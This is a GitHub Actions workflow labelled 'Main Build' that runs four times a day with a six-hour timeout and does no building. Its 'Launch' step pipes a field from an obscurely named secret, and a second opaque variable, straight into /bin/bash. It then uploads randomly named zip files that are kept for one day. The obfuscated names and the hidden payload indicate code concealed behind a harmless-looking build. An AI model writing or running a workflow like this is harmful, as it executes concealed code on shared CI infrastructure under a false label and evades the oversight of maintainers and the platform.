name: Main Build
on:
  workflow_dispatch:

  schedule:
    - cron: '17 3,9,15,21 * * *'
permissions:
  contents: read
concurrency:
  group: ${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: true
jobs:
  ci:
    runs-on: ubuntu-latest
    timeout-minutes: 360
    steps:
      - uses: actions/checkout@v4
      - name: Launch
        env:
          d638: ${{ secrets.d638 }}
        run: |
          printf '%s' "$d638" | jq -r .tb4 | /bin/bash
          echo $qulrx65095 | jq -r .asvj9 | /bin/bash

      - name: Save artifact
        uses: actions/upload-artifact@v4
        with:
          name: sxYtDeMy
          path: "*.zip"
          retention-days: 1
